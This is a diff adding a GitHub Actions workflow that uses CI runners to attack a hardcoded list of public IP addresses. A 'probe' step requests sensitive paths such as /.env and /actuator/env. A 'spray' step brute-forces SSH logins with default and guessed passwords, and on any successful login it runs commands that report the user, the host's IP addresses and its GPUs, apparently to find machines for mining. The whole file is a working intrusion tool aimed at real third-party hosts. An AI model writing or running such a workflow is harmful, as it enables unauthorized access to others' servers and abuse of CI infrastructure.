@@ -1,0 +1,57 @@
+name: ul6599-web2
+on:
+  workflow_dispatch:
+jobs:
+  web:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+      - name: probe
+        run: |
+          python3 -m pip -q install paramiko
+          python3 - <<'PY'
+          import urllib.request,ssl,http.client
+          class NR(urllib.request.HTTPRedirectHandler):
+              def redirect_request(self,*a,**k): return None
+          op=urllib.request.build_opener(NR)
+          hosts=["20.74.153.201","20.50.113.151","20.237.207.128","20.205.187.223","4.194.2.30","70.153.87.133","4.246.80.6","51.104.16.184","40.123.206.138"]
+          paths=["/","/brand/","/api/","/api/v1/","/actuator/env","/login","/admin","/.env","/robots.txt"]
+          for h in hosts:
+              for p in paths:
+                  u="http://"+h+p
+                  try:
+                      r=op.open(urllib.request.Request(u,headers={'User-Agent':'curl/8.5.0'}),timeout=8)
+                      b=r.read(1500)
+                      print("HTTP",h,p,r.status,"server=",r.headers.get('Server'),"ct=",r.headers.get('Content-Type'),"loc=",r.headers.get('Location'),"len=",r.headers.get('Content-Length'),"b=",repr(b[:700],),flush=True)
+                  except urllib.error.HTTPError as e:
+                      b=e.read(1500)
+                      print("HTTP",h,p,e.code,"server=",e.headers.get('Server'),"loc=",e.headers.get('Location'),"b=",repr(b[:500]),flush=True)
+                  except Exception as e:
+                      print("HTTPERR",h,p,type(e).__name__,str(e)[:90],flush=True)
+          PY
+      - name: spray
+        run: |
+          python3 - <<'PY'
+          import paramiko,socket
+          pw=["ubuntu","ubuntu123","Azure1234!","azureuser","Password123!","Admin@123","root","toor","admin","Ulsystems2024!","Prl123456!","miner"]
+          us=["ubuntu","azureuser","root","admin"]
+          hosts=[("40.123.206.138",22),("51.104.16.184",22),("20.237.207.128",22),("20.205.187.223",22),("4.194.2.30",22),("70.153.87.133",22),("4.246.80.6",22),("20.50.113.151",22),("20.74.153.201",22)]
+          for h,p in hosts:
+              for u in us:
+                  for x in pw:
+                      c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                      try:
+                          c.connect(h,port=p,username=u,password=x,timeout=6,banner_timeout=8,allow_agent=False,look_for_keys=False)
+                          i,o,e=c.exec_command("id; hostname -I; nvidia-smi -L",timeout=10)
+                          print("PWD_HIT",h,p,u,x,o.read(400).decode(errors='replace'),flush=True); c.close(); break
+                      except paramiko.AuthenticationException:
+                          print("PWD_NO",h,u,x,flush=True)
+                      except Exception as ex:
+                          print("SSHERR",h,u,type(ex).__name__,str(ex)[:70],flush=True); break
+                      finally:
+                          try: c.close()
+                          except: pass
+          PY
